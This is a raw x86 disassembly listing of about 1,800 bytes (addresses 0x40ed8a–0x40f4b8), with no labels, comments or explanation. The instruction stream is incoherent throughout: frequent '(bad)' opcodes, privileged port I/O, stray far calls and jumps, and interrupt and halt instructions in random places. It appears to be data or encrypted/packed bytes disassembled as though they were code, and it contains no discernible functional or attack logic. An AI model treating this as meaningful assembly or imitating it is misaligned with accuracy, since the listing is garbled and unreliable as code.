  40ed8a:	jmp    0x40ed9e
  40ed8c:	rcr    BYTE PTR [ecx+eax*2-0x32fb01d2],1
  40ed93:	sti    
  40ed94:	adc    BYTE PTR [ebx],cl
  40ed96:	bound  edi,QWORD PTR [edx+0xa]
  40ed99:	stc    
  40ed9a:	add    esi,DWORD PTR [ebp+0x11]
  40ed9d:	in     al,dx
  40ed9e:	popf   
  40ed9f:	int    0xd
  40eda1:	jnp    0x40ee02
  40eda3:	ret    
  40eda4:	or     bh,BYTE PTR [ecx-0x46]
  40eda7:	fcomi  st,st(1)
  40eda9:	jmp    0xfb995275
  40edae:	stos   BYTE PTR es:[edi],al
  40edaf:	and    ah,BYTE PTR [ecx+0xb]
  40edb2:	pusha  
  40edb3:	imul   esi,DWORD PTR [eax],0xf9483665
  40edb9:	jmp    0x40ee24
  40edbb:	push   cs
  40edbc:	adc    eax,0x877ec86
  40edc1:	and    ch,al
  40edc3:	pop    ss
  40edc4:	jae    0x40ee1d
  40edc6:	mov    ss,ebx
  40edc8:	sub    al,0x6d
  40edca:	mov    ch,BYTE PTR [ebx-0x5]
  40edcd:	and    DWORD PTR [ebp+0x12b1660d],esi
  40edd3:	xchg   esi,eax
  40edd4:	fcomp  DWORD PTR [ebx-0x4f]
  40edd7:	dec    edi
  40edd8:	adc    DWORD PTR [esi],ebx
  40edda:	aas    
  40eddb:	and    al,0x96
  40eddd:	or     BYTE PTR [eax],al
  40eddf:	mov    cl,0xab
  40ede1:	push   edx
  40ede2:	cmp    al,0x82
  40ede4:	mov    edi,0x82ac3dab
  40ede9:	sar    BYTE PTR ds:0x32382275,1
  40edef:	push   edx
  40edf0:	sbb    eax,0x470412f7
  40edf5:	jae    0x40ee27
  40edf7:	jbe    0x40ee1b
  40edf9:	adc    eax,0x8d99554a
  40edfe:	adc    edi,DWORD PTR [esi]
  40ee00:	sbb    edx,DWORD PTR [ebp+0x5741720c]
  40ee06:	pop    esi
  40ee07:	dec    ecx
  40ee08:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ee09:	push   0x8de05ca2
  40ee0e:	das    
  40ee0f:	xchg   esp,eax
  40ee10:	or     eax,0xbc2318b7
  40ee15:	jo     0x40edfd
  40ee17:	mov    dh,0xf6
  40ee19:	mov    al,ds:0x84e8f7b3
  40ee1e:	cmc    
  40ee1f:	push   ebx
  40ee20:	pop    ds
  40ee21:	mov    ds:0x3d3fc04a,eax
  40ee26:	sub    DWORD PTR [esi+esi*8+0x704bb4a1],ebp
  40ee2d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ee2e:	bound  edx,QWORD PTR [ebp+0x4fe090a3]
  40ee34:	inc    edi
  40ee35:	imul   edx,DWORD PTR [eax+0x79d3793b],0x56
  40ee3c:	dec    ebp
  40ee3d:	jle    0x40ee8f
  40ee3f:	imul   eax,DWORD PTR [edi+0x62],0xffffffb2
  40ee43:	sub    al,0x92
  40ee45:	in     al,dx
  40ee46:	or     al,0xd
  40ee48:	(bad)  
  40ee49:	mov    ebp,0x22afe1d2
  40ee4e:	dec    edi
  40ee4f:	xchg   ecx,eax
  40ee50:	(bad)  
  40ee51:	cmp    eax,DWORD PTR [eax+0x16b25057]
  40ee57:	mov    ds:0x8b15b6be,eax
  40ee5c:	loop   0x40ee52
  40ee5e:	adc    eax,0xebcffb6b
  40ee63:	sar    BYTE PTR [edx-0x1095c071],1
  40ee69:	das    
  40ee6a:	push   esp
  40ee6b:	xchg   esp,eax
  40ee6c:	cmp    al,0x4f
  40ee6e:	js     0x40ee35
  40ee70:	popa   
  40ee71:	push   edi
  40ee72:	scas   al,BYTE PTR es:[edi]
  40ee73:	ret    0xf29d
  40ee76:	xchg   BYTE PTR [ebp-0x6b],cl
  40ee79:	cmp    ch,ch
  40ee7b:	cmp    ebp,DWORD PTR [ecx]
  40ee7d:	call   0x26c9:0x882f58b8
  40ee84:	mov    ebp,0xa769b891
  40ee89:	pop    esi
  40ee8a:	jecxz  0x40ee4d
  40ee8c:	or     BYTE PTR [ebx+0x7d],0x81
  40ee90:	imul   esi,ecx,0x9c94d823
  40ee96:	mov    bl,0x99
  40ee98:	ins    DWORD PTR es:[edi],dx
  40ee99:	into   
  40ee9a:	mov    al,0xe0
  40ee9c:	inc    ebx
  40ee9d:	aas    
  40ee9e:	rcl    BYTE PTR [edx],1
  40eea0:	in     eax,0x67
  40eea2:	or     al,al
  40eea4:	stc    
  40eea5:	adc    eax,DWORD PTR ds:0x5b28a10c
  40eeab:	in     eax,0xb2
  40eead:	int    0xc0
  40eeaf:	xlat   BYTE PTR ds:[ebx]
  40eeb0:	jae    0x40ee61
  40eeb2:	push   eax
  40eeb3:	xor    DWORD PTR [esp+ebx*8],0x4c
  40eeb7:	cmp    DWORD PTR [edi+0x5d],esp
  40eeba:	scas   eax,DWORD PTR es:[edi]
  40eebb:	and    ebp,DWORD PTR [esi+0x61]
  40eebe:	addr16 cmp al,0xf7
  40eec1:	rcl    cl,1
  40eec3:	arpl   bp,ax
  40eec5:	add    eax,esi
  40eec7:	shl    DWORD PTR [edx+0x5c755675],cl
  40eecd:	adc    DWORD PTR [ebp-0x1b],edi
  40eed0:	xchg   esp,eax
  40eed1:	dec    ecx
  40eed2:	adc    al,0x6b
  40eed4:	mov    ds:0x4474b70a,eax
  40eed9:	std    
  40eeda:	cmp    ebx,ebx
  40eedc:	jnp    0x40ef4e
  40eede:	inc    ecx
  40eedf:	cmp    DWORD PTR [eax+0x6dfa8e65],0xd2ae4d02
  40eee9:	stos   DWORD PTR es:[edi],eax
  40eeea:	and    edx,edx
  40eeec:	ret    
  40eeed:	lea    esp,[edi+0x73]
  40eef0:	ins    DWORD PTR es:[edi],dx
  40eef1:	push   ss
  40eef2:	stc    
  40eef3:	ins    DWORD PTR es:[edi],dx
  40eef4:	rcr    ebx,cl
  40eef6:	xchg   edi,eax
  40eef7:	sar    cl,0x14
  40eefa:	cld    
  40eefb:	jno    0x40eeb6
  40eefd:	mov    dh,BYTE PTR [ebx+0x787bca0a]
  40ef03:	and    DWORD PTR ds:0x1c04a7f6,0x60a5b8c3
  40ef0d:	mov    ds:0x6cdfba14,eax
  40ef12:	(bad)  
  40ef13:	call   0x81a0:0xd9568f07
  40ef1a:	std    
  40ef1b:	jno    0x40ef65
  40ef1d:	push   ds
  40ef1e:	mov    bl,0x95
  40ef20:	gs push ds
  40ef22:	and    ah,BYTE PTR [edi+0x33eebb0b]
  40ef28:	dec    edi
  40ef29:	(bad)  
  40ef2a:	pop    eax
  40ef2b:	mov    edi,0xc04ab618
  40ef30:	lods   eax,DWORD PTR ds:[esi]
  40ef31:	imul   edi,DWORD PTR [edi+0x63cbc5d1],0xffffffa8
  40ef38:	stos   BYTE PTR es:[edi],al
  40ef39:	es inc ebx
  40ef3b:	imul   esi,DWORD PTR [eax],0x18
  40ef3e:	add    BYTE PTR [esi+0x3a],dl
  40ef41:	stos   DWORD PTR es:[edi],eax
  40ef42:	cld    
  40ef43:	imul   esp,DWORD PTR [edi-0x7fbfcfca],0xdcda163
  40ef4d:	das    
  40ef4e:	in     al,dx
  40ef4f:	cwde   
  40ef50:	and    bl,BYTE PTR [edx+eiz*2]
  40ef53:	xchg   edi,eax
  40ef54:	fdivr  DWORD PTR [edx+0x56]
  40ef57:	sar    DWORD PTR [ecx-0x256a0cf0],cl
  40ef5d:	push   es
  40ef5e:	cmp    BYTE PTR [esi-0x5b],bl
  40ef61:	(bad)  
  40ef63:	inc    ebx
  40ef64:	add    cl,BYTE PTR [eax+0x40]
  40ef67:	xchg   ebp,eax
  40ef68:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ef69:	ss jno 0x40ef45
  40ef6c:	popa   
  40ef6d:	je     0x40efde
  40ef6f:	(bad)  [ecx]
  40ef71:	jae    0x40ef61
  40ef73:	jns    0x40efdc
  40ef75:	scas   eax,DWORD PTR es:[edi]
  40ef76:	enter  0x5ce4,0x19
  40ef7a:	ss jmp 0x41c8:0x64fa2d86
  40ef82:	or     DWORD PTR [edi-0x74],esp
  40ef85:	sub    ch,BYTE PTR [esi-0x4990777a]
  40ef8b:	add    DWORD PTR [ebp+0x10],0xffffffa1
  40ef8f:	es js  0x40ef47
  40ef92:	xchg   ecx,eax
  40ef93:	sub    al,0xdf
  40ef95:	or     al,0xe8
  40ef97:	jbe    0x40efd8
  40ef99:	pop    ds
  40ef9a:	cmp    eax,0xfaa4743e
  40ef9f:	fucomi st,st(1)
  40efa1:	sar    DWORD PTR [ecx],0x88
  40efa4:	lds    edx,FWORD PTR [esi-0x3acaaa8]
  40efaa:	shl    BYTE PTR [ecx],cl
  40efac:	test   eax,0x911c7a4f
  40efb1:	and    ebx,DWORD PTR [ecx]
  40efb3:	in     al,dx
  40efb4:	mov    ds:0x40335d05,al
  40efb9:	inc    eax
  40efba:	icebp  
  40efbb:	mov    ch,0xd2
  40efbd:	adc    ebp,ecx
  40efbf:	push   0x58daf141
  40efc4:	adc    DWORD PTR [ebp+0xf],esi
  40efc7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40efc8:	jnp    0x40ef8b
  40efca:	fs cmp bl,dh
  40efcd:	jne    0x40ef96
  40efcf:	cmp    ah,al
  40efd1:	xchg   dl,ah
  40efd3:	repz iret 
  40efd5:	popa   
  40efd6:	test   BYTE PTR [edi+0x44],dl
  40efd9:	iret   
  40efda:	(bad)  
  40efdb:	sahf   
  40efdc:	adc    ch,BYTE PTR [edx+0x15]
  40efdf:	xchg   ebp,eax
  40efe0:	ret    0xd0bb
  40efe3:	scas   eax,DWORD PTR es:[edi]
  40efe4:	cmp    ebp,0x6a2cc420
  40efea:	jmp    0xf89f:0xd88cf3e0
  40eff1:	in     eax,0xd1
  40eff3:	push   esp
  40eff4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40eff5:	xcrypt-cfb (bad)
  40eff6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40eff7:	mov    eax,ds:0x2efce8a
  40effc:	test   BYTE PTR [edx+0x22],ch
  40efff:	cdq    
  40f000:	or     al,0x3a
  40f002:	fnsave [ebp-0x9]
  40f005:	ror    BYTE PTR [ebp+0x389d3003],cl
  40f00b:	xor    eax,DWORD PTR [ebp-0x5b]
  40f00e:	mov    ebx,DWORD PTR [ecx]
  40f010:	pop    ebx
  40f011:	in     eax,dx
  40f012:	sbb    eax,0xe9a25bc1
  40f017:	fwait
  40f018:	sub    ch,BYTE PTR [ebp+0x2049418a]
  40f01e:	push   ecx
  40f01f:	cmp    bh,BYTE PTR [edi]
  40f021:	push   ds
  40f022:	sbb    DWORD PTR [eax+0x8bf7489],ecx
  40f028:	mov    esi,0xae249ed1
  40f02d:	push   esi
  40f02e:	xor    DWORD PTR [ebx-0x40],ebp
  40f031:	mov    ecx,0x10786c8e
  40f036:	push   ss
  40f037:	or     ebx,DWORD PTR [edi-0x2e]
  40f03a:	in     al,dx
  40f03b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f03c:	pop    es
  40f03d:	pop    ss
  40f03e:	mov    ebp,0xd851061c
  40f043:	test   BYTE PTR [ecx-0x22],ah
  40f046:	or     ah,ah
  40f048:	cli    
  40f049:	push   ss
  40f04a:	pop    esp
  40f04b:	push   eax
  40f04c:	dec    ebx
  40f04d:	mov    esp,0xf8dba7c4
  40f052:	mov    eax,0xfd0915c9
  40f057:	fyl2x  
  40f059:	fwait
  40f05a:	jae    0x40f0bf
  40f05c:	ja     0x40f063
  40f05e:	pmulhw mm3,mm5
  40f061:	(bad)  
  40f062:	das    
  40f063:	cld    
  40f064:	repz es leave 
  40f067:	xor    BYTE PTR [eax+0x6dfe4795],0x59
  40f06e:	lods   al,BYTE PTR ds:[esi]
  40f06f:	pop    esp
  40f070:	out    0x21,al
  40f072:	mov    esi,0x4a6d44cf
  40f077:	sub    al,0x80
  40f079:	je     0x40f041
  40f07b:	mov    al,0x60
  40f07d:	out    0x1f,al
  40f07f:	enter  0x270c,0x60
  40f083:	push   0x8af90c3c
  40f088:	iret   
  40f089:	pop    ds
  40f08a:	sahf   
  40f08b:	xchg   BYTE PTR [edx+0x27a83f13],ch
  40f091:	clc    
  40f092:	jb     0x40f0fe
  40f094:	rcr    DWORD PTR [edi+0x54],1
  40f097:	xchg   ebp,eax
  40f098:	sbb    edi,eax
  40f09a:	outs   dx,BYTE PTR ds:[esi]
  40f09b:	pop    ds
  40f09c:	mov    esi,0x85f4cc09
  40f0a1:	cli    
  40f0a2:	mov    ah,0xcc
  40f0a4:	loop   0x40f097
  40f0a6:	xor    eax,0x1d073b77
  40f0ab:	xor    ah,cl
  40f0ad:	jnp    0x40f067
  40f0af:	mov    eax,ds:0x55029803
  40f0b4:	scas   al,BYTE PTR es:[edi]
  40f0b5:	jp     0x40f11a
  40f0b7:	add    eax,DWORD PTR [esi+0x6b]
  40f0ba:	hlt    
  40f0bb:	xchg   ecx,edx
  40f0bd:	inc    ecx
  40f0be:	shl    bl,cl
  40f0c0:	retf   
  40f0c1:	push   ecx
  40f0c2:	iret   
  40f0c3:	jmp    0x5b0b79cb
  40f0c8:	push   0x2b663c9f
  40f0cd:	pushw  ss
  40f0cf:	out    0x9f,al
  40f0d1:	test   eax,0xecd9b6c3
  40f0d6:	fsin   
  40f0d8:	cdq    
  40f0d9:	mov    DWORD PTR [eax+0x4778d74e],ebp
  40f0df:	push   ss
  40f0e0:	loop   0x40f0eb
  40f0e2:	pop    edx
  40f0e3:	fidiv  WORD PTR [eax]
  40f0e5:	xchg   ecx,eax
  40f0e6:	clc    
  40f0e7:	xchg   edi,eax
  40f0e8:	inc    ebp
  40f0e9:	xlat   BYTE PTR ds:[ebx]
  40f0ea:	inc    eax
  40f0eb:	sbb    al,0x76
  40f0ed:	cmp    eax,0x6c993c44
  40f0f2:	mov    BYTE PTR [esi],0xc5
  40f0f5:	cld    
  40f0f6:	stos   DWORD PTR es:[edi],eax
  40f0f7:	ja     0x40f122
  40f0f9:	mov    ebp,0xd4148cc1
  40f0fe:	sti    
  40f0ff:	aad    0x2d
  40f101:	adc    al,0xb
  40f103:	add    BYTE PTR [edi-0xd],0x70
  40f107:	sbb    dl,BYTE PTR [edx]
  40f109:	mov    ah,BYTE PTR [ebp+0x19b810de]
  40f10f:	cdq    
  40f110:	xchg   ecx,eax
  40f111:	mov    al,0x16
  40f113:	ss mov al,0x2c
  40f116:	icebp  
  40f117:	lock xor al,0xc6
  40f11a:	fs out dx,al
  40f11c:	sub    DWORD PTR [edx+0x5fde1c5c],0x65
  40f123:	das    
  40f124:	aaa    
  40f125:	pop    ecx
  40f126:	cmp    eax,0x4c839e81
  40f12b:	data16 es ja 0x40f0b3
  40f12f:	es mov cs,ebp
  40f132:	jecxz  0x40f199
  40f134:	jne    0x40f199
  40f136:	xchg   ecx,eax
  40f137:	fnstsw WORD PTR [ecx-0x370643e4]
  40f13d:	add    eax,DWORD PTR [ebx+ebp*8]
  40f140:	outs   dx,BYTE PTR ds:[esi]
  40f141:	mov    eax,0x3088fd48
  40f146:	mov    edx,0xc9e78401
  40f14b:	fstp   TBYTE PTR [eax+0x5a23e12e]
  40f151:	push   0x2be8b9f5
  40f156:	cmp    DWORD PTR [eax+edx*4-0x486260ce],esp
  40f15d:	mov    dh,0xcf
  40f15f:	aas    
  40f160:	mov    WORD PTR [eax],?
  40f162:	bnd ja 0x40f145
  40f165:	es inc ecx
  40f167:	dec    ebx
  40f168:	xchg   edx,eax
  40f169:	mov    DWORD PTR [ecx-0xc73bf80],edx
  40f16f:	scas   eax,DWORD PTR es:[edi]
  40f170:	adc    al,ch
  40f172:	push   eax
  40f173:	ret    0x41c
  40f176:	mov    WORD PTR [esi+0x48],si
  40f17a:	mov    eax,ds:0x12566064
  40f17f:	leavew 
  40f181:	pushf  
  40f182:	pop    esp
  40f183:	ds (bad) 
  40f185:	addr16 mov edx,0x94fc5603
  40f18b:	fs scas al,BYTE PTR es:[edi]
  40f18d:	addr16 clc 
  40f18f:	arpl   WORD PTR [edx],di
  40f191:	jl     0x40f1ad
  40f193:	sbb    DWORD PTR [esi+0x4b],0xa52a6591
  40f19a:	in     al,dx
  40f19b:	cwde   
  40f19c:	outs   dx,BYTE PTR ds:[esi]
  40f19d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f19e:	outs   dx,DWORD PTR ds:[esi]
  40f19f:	cmp    eax,0xf756ccdd
  40f1a4:	sbb    al,BYTE PTR [edi+0x4282948a]
  40f1aa:	xchg   edi,eax
  40f1ab:	inc    ecx
  40f1ac:	mov    ch,0xc7
  40f1ae:	jnp    0x40f21e
  40f1b0:	sahf   
  40f1b1:	das    
  40f1b2:	and    al,0x11
  40f1b4:	shr    DWORD PTR [ebp+edx*4-0x43],0xde
  40f1b9:	stc    
  40f1ba:	ds call 0x6f98245e
  40f1c0:	outs   dx,BYTE PTR ds:[esi]
  40f1c2:	lock push ds
  40f1c4:	push   0xffffffcb
  40f1c6:	pusha  
  40f1c7:	out    dx,eax
  40f1c8:	sbb    cl,BYTE PTR [ecx]
  40f1ca:	pop    edi
  40f1cb:	or     DWORD PTR [edi+edx*1],ecx
  40f1ce:	jae    0x40f1f0
  40f1d0:	dec    ebx
  40f1d1:	outs   dx,BYTE PTR ds:[esi]
  40f1d2:	pop    es
  40f1d3:	mov    eax,0x1d733a47
  40f1d8:	in     eax,0xda
  40f1da:	adc    esi,DWORD PTR [eax-0x69496108]
  40f1e0:	push   eax
  40f1e1:	sbb    al,0x5b
  40f1e3:	dec    dl
  40f1e5:	jb     0x40f169
  40f1e7:	bound  eax,QWORD PTR [esi]
  40f1e9:	rcr    DWORD PTR [edi],1
  40f1eb:	jnp    0x40f213
  40f1ed:	out    0x3,al
  40f1ef:	pop    es
  40f1f0:	stos   BYTE PTR es:[edi],al
  40f1f1:	ins    DWORD PTR es:[edi],dx
  40f1f2:	les    ecx,FWORD PTR [ebx-0x7c]
  40f1f5:	cmp    DWORD PTR [esi+0x20cd8ca],0xffffffb2
  40f1fc:	imul   esp,eax,0xffffff8e
  40f1ff:	dec    ecx
  40f200:	lahf   
  40f201:	dec    ebx
  40f202:	arpl   WORD PTR [edx+eax*1],bx
  40f205:	in     al,dx
  40f206:	mov    bl,0x11
  40f208:	ror    bh,0x6e
  40f20b:	and    BYTE PTR [eax-0x17],0x93
  40f20f:	mov    eax,0xb11a8da0
  40f214:	sbb    eax,0x3078aa18
  40f219:	lods   eax,DWORD PTR ds:[esi]
  40f21a:	sbb    edi,DWORD PTR cs:[ecx+0x69]
  40f21e:	hlt    
  40f21f:	icebp  
  40f220:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f221:	scas   eax,DWORD PTR es:[edi]
  40f222:	pusha  
  40f223:	jmp    0xce84d09e
  40f228:	out    0x62,eax
  40f22a:	pop    ecx
  40f22b:	cli    
  40f22c:	xchg   BYTE PTR [ebx+0x2a],bl
  40f22f:	aad    0xdc
  40f231:	mov    ebp,0x702f4cbf
  40f236:	or     DWORD PTR [edx+0x49],ebx
  40f239:	sub    al,0xe6
  40f23b:	mov    dh,0x76
  40f23d:	lock mov ebp,0x21cfac5f
  40f243:	ins    BYTE PTR es:[edi],dx
  40f244:	aad    0x65
  40f246:	and    al,0xe4
  40f248:	jae    0x40f27e
  40f24a:	xchg   DWORD PTR [ecx+ebp*1+0x2],ebx
  40f24e:	(bad)  
  40f24f:	and    eax,0xa681c9e8
  40f254:	popf   
  40f255:	mov    esp,0x2d2387f8
  40f25a:	add    DWORD PTR [eax+0x58ca7650],esi
  40f260:	sub    ebx,DWORD PTR [edx]
  40f262:	dec    edx
  40f263:	mov    eax,ds:0xae1b2407
  40f268:	inc    eax
  40f269:	sbb    BYTE PTR [eax-0x8d5bc54],0x4
  40f270:	push   esp
  40f271:	test   eax,0x594e3ed7
  40f276:	xlat   BYTE PTR ds:[ebx]
  40f277:	cmp    DWORD PTR [eax],ecx
  40f279:	int3   
  40f27a:	sbb    DWORD PTR [edx-0x38],esi
  40f27d:	ja     0x40f241
  40f27f:	ficom  WORD PTR [edi+0x1a8e27e0]
  40f285:	push   cs
  40f286:	imul   ebx,ebx,0x11
  40f289:	cmc    
  40f28a:	fst    DWORD PTR [ebp-0x46]
  40f28d:	mov    ch,0xa9
  40f28f:	scas   al,BYTE PTR es:[edi]
  40f290:	out    dx,eax
  40f291:	out    0xdb,al
  40f293:	arpl   bx,di
  40f295:	mov    edi,0x81b5c60
  40f29a:	mov    ds:0x60fd6d68,eax
  40f29f:	jmp    0x40f234
  40f2a1:	jle    0x40f288
  40f2a3:	(bad)  [ebp-0x7b]
  40f2a6:	jo     0x40f2ba
  40f2a8:	idiv   BYTE PTR [ecx]
  40f2aa:	enter  0x4ac,0xdc
  40f2ae:	lods   al,BYTE PTR ds:[esi]
  40f2af:	fwait
  40f2b0:	mov    bl,0x96
  40f2b2:	jae    0x40f331
  40f2b4:	out    dx,al
  40f2b5:	xor    eax,0x42621300
  40f2ba:	in     eax,0x9d
  40f2bc:	mov    al,0x9c
  40f2be:	mov    ch,dh
  40f2c0:	lea    ebx,[edi+0x28dba4c1]
  40f2c6:	into   
  40f2c7:	jo     0x40f28f
  40f2c9:	xchg   esi,eax
  40f2ca:	(bad)  
  40f2cb:	pop    edi
  40f2cc:	mov    bl,0x21
  40f2ce:	fadd   DWORD PTR [edx]
  40f2d0:	dec    ebp
  40f2d1:	sbb    ecx,DWORD PTR [edx]
  40f2d3:	push   esi
  40f2d4:	pop    eax
  40f2d5:	inc    eax
  40f2d6:	aam    0x72
  40f2d8:	(bad)  
  40f2da:	or     dh,ah
  40f2dc:	lock sub bl,BYTE PTR [ecx+0x51]
  40f2e0:	shr    BYTE PTR [edi+0x67],0x34
  40f2e4:	adc    cl,BYTE PTR [esi+edx*8+0x2713bbb]
  40f2eb:	mov    al,0xe1
  40f2ed:	sub    al,BYTE PTR [ebp-0x5]
  40f2f0:	sar    BYTE PTR [edx+ebp*1+0x18],cl
  40f2f4:	shl    DWORD PTR [esi-0xf],cl
  40f2f7:	sub    dl,cl
  40f2f9:	loop   0x40f28d
  40f2fb:	mov    esi,0xca7097a3
  40f300:	outs   dx,BYTE PTR ds:[esi]
  40f301:	jecxz  0x40f2b8
  40f303:	pusha  
  40f304:	fist   DWORD PTR [edx]
  40f306:	shl    DWORD PTR [esi+0x21],0xb5
  40f30a:	imul   ecx,DWORD PTR [esi+0x62],0x4d
  40f30e:	xchg   esp,eax
  40f30f:	jl     0x40f2d6
  40f311:	fimul  DWORD PTR [ecx+0x60]
  40f314:	sbb    al,0x7f
  40f316:	std    
  40f317:	cmp    al,BYTE PTR [ebx+0x25]
  40f31a:	cli    
  40f31b:	jle    0x40f37d
  40f31d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f31e:	sar    BYTE PTR [edi+0x30],1
  40f321:	sbb    BYTE PTR [edx-0x11],0x9f
  40f325:	test   eax,0xecaeb34d
  40f32a:	fsub   st,st(0)
  40f32c:	jg     0x40f325
  40f32e:	pusha  
  40f32f:	ins    BYTE PTR es:[edi],dx
  40f330:	jle    0x40f2f7
  40f332:	repz dec ebp
  40f334:	iret   
  40f335:	dec    esp
  40f336:	fsubr  QWORD PTR [esi-0x77ac7f63]
  40f33c:	or     al,0x39
  40f33e:	xor    DWORD PTR [edx-0x2f],0x12
  40f342:	stc    
  40f343:	nop
  40f344:	sbb    eax,0x2194d52c
  40f349:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f34a:	cmp    eax,0x85806535
  40f34f:	dec    ebp
  40f350:	or     eax,0xba2bf091
  40f355:	sub    esp,DWORD PTR [ebp+0x73]
  40f358:	test   ebx,ebx
  40f35a:	arpl   WORD PTR [ecx+ebx*4],bp
  40f35d:	call   0xf02b:0x618fbfe5
  40f364:	or     bh,BYTE PTR [edi-0x50]
  40f367:	or     eax,0x1e8e5851
  40f36c:	fadd   DWORD PTR [edx]
  40f36e:	inc    ebx
  40f36f:	iret   
  40f370:	stc    
  40f371:	xor    edx,ebx
  40f373:	mov    edx,0xee8b0f17
  40f378:	es dec ebx
  40f37a:	sub    al,0xb7
  40f37c:	sub    cl,ch
  40f37e:	das    
  40f37f:	not    BYTE PTR [esi+eax*8]
  40f382:	sub    al,0x33
  40f384:	inc    edi
  40f385:	push   0xffffffc1
  40f387:	jg     0x40f396
  40f389:	jnp    0x40f3f8
  40f38b:	jnp    0x40f3ef
  40f38d:	pop    esp
  40f38e:	adc    ebx,DWORD PTR [eax+eiz*4]
  40f391:	xchg   edx,eax
  40f392:	inc    edi
  40f393:	sbb    dx,WORD PTR [esi]
  40f396:	inc    esi
  40f397:	push   ebp
  40f398:	xchg   edi,eax
  40f399:	mul    DWORD PTR [ecx]
  40f39b:	aad    0xff
  40f39d:	mov    WORD PTR [esi+0x2b],es
  40f3a0:	push   ebp
  40f3a1:	div    DWORD PTR [ecx+eiz*1-0x7e8449c9]
  40f3a8:	stc    
  40f3a9:	mov    DWORD PTR [edx],ebx
  40f3ab:	imul   ebp,DWORD PTR [edi],0xffffffc4
  40f3ae:	addr16 mov edi,0xa0085ceb
  40f3b4:	loop   0x40f3cd
  40f3b6:	xchg   ecx,eax
  40f3b7:	push   0xf6df5e17
  40f3bc:	in     al,dx
  40f3bd:	ror    DWORD PTR [ecx],cl
  40f3bf:	sub    DWORD PTR [ecx-0x7a],0xb9091110
  40f3c6:	scas   eax,DWORD PTR es:[edi]
  40f3c7:	mov    WORD PTR [edx],cs
  40f3c9:	ins    BYTE PTR es:[edi],dx
  40f3ca:	pop    edx
  40f3cb:	push   ss
  40f3cc:	out    0x66,al
  40f3ce:	pop    edi
  40f3cf:	test   al,0x15
  40f3d1:	leave  
  40f3d2:	retf   
  40f3d3:	mov    edi,ebp
  40f3d5:	pop    ebx
  40f3d6:	addr16 xchg edi,eax
  40f3d8:	nop
  40f3d9:	pop    ecx
  40f3da:	or     eax,0x5b774e8e
  40f3df:	mov    WORD PTR [eax],fs
  40f3e1:	jnp    0x40f457
  40f3e3:	outs   dx,DWORD PTR ds:[esi]
  40f3e4:	sbb    DWORD PTR [ebx],eax
  40f3e6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f3e7:	addr16 mov eax,ds:0xf4fd
  40f3eb:	mov    dl,0x96
  40f3ed:	mov    al,0xa7
  40f3ef:	jne    0x40f3ef
  40f3f1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f3f2:	fbld   TBYTE PTR [eax]
  40f3f4:	pushf  
  40f3f5:	and    BYTE PTR [eax-0x3],0x81
  40f3f9:	test   esi,esi
  40f3fb:	fist   WORD PTR [edx]
  40f3fd:	(bad)  
  40f3fe:	cli    
  40f3ff:	jmp    0x1955e795
  40f404:	stos   DWORD PTR es:[edi],eax
  40f405:	cld    
  40f406:	fmulp  st(4),st
  40f408:	fst    DWORD PTR [esi]
  40f40a:	jbe    0x40f444
  40f40c:	dec    eax
  40f40d:	cmp    DWORD PTR [esi-0x1],esi
  40f410:	and    ebp,esi
  40f412:	adc    DWORD PTR [esi],ebx
  40f414:	pop    ds
  40f415:	xor    BYTE PTR [edx+0x7d],ah
  40f418:	fwait
  40f419:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f41a:	ret    0x73e1
  40f41d:	shl    BYTE PTR [ebx-0x69],1
  40f420:	xchg   ebx,eax
  40f421:	add    eax,0x99c02150
  40f426:	cmp    DWORD PTR [ebp-0xc05f884],esp
  40f42c:	inc    ecx
  40f42d:	repnz fisubr DWORD PTR ds:[edx-0x6106c8ca]
  40f435:	stos   DWORD PTR es:[edi],eax
  40f436:	inc    ebx
  40f437:	popa   
  40f438:	std    
  40f439:	repnz test eax,0xce06fe16
  40f43f:	mov    ecx,0x46b24a86
  40f444:	adc    edi,DWORD PTR [ebx+esi*1]
  40f447:	repnz xchg ebx,eax
  40f449:	dec    ebp
  40f44a:	cmp    eax,0xff545ec5
  40f44f:	sub    dh,BYTE PTR [ecx-0x7944a71]
  40f455:	cld    
  40f456:	inc    esi
  40f457:	popa   
  40f458:	jle    0x40f465
  40f45a:	xor    al,0x7
  40f45c:	pop    es
  40f45d:	outs   dx,DWORD PTR ds:[esi]
  40f45e:	adc    al,0x56
  40f460:	mov    ebx,0xc2fe5b65
  40f465:	jecxz  0x40f472
  40f467:	scas   eax,DWORD PTR es:[edi]
  40f468:	inc    ecx
  40f469:	xchg   edi,eax
  40f46a:	shl    bl,1
  40f46c:	and    eax,0xf2bef26d
  40f471:	xchg   ecx,eax
  40f472:	daa    
  40f473:	aaa    
  40f474:	loop   0x40f4db
  40f476:	out    dx,al
  40f477:	adc    BYTE PTR [ecx+0x22],0xa3
  40f47b:	imul   eax,DWORD PTR [edi-0x39],0x34
  40f47f:	pop    ecx
  40f480:	mov    eax,0x34d706aa
  40f485:	stos   BYTE PTR es:[edi],al
  40f486:	ret    0xc0ca
  40f489:	mov    ch,0xeb
  40f48b:	xchg   edx,eax
  40f48c:	xchg   esp,eax
  40f48d:	ret    0xfcad
  40f490:	xor    al,0x9c
  40f492:	imul   edi,DWORD PTR [ebx-0x700611af],0xee3f3d19
  40f49c:	cmc    
  40f49d:	jecxz  0x40f4f2
  40f49f:	inc    edx
  40f4a0:	mov    cs,WORD PTR [edx+0x44]
  40f4a3:	out    dx,al
  40f4a4:	outs   dx,DWORD PTR ds:[esi]
  40f4a5:	les    ebx,FWORD PTR [edx-0x73829e67]
  40f4ab:	pop    es
  40f4ac:	in     al,0x92
  40f4ae:	and    ecx,esi
  40f4b0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f4b1:	cmp    di,WORD PTR [ecx+0x60ec8fc1]
  40f4b8:	inc    ebp
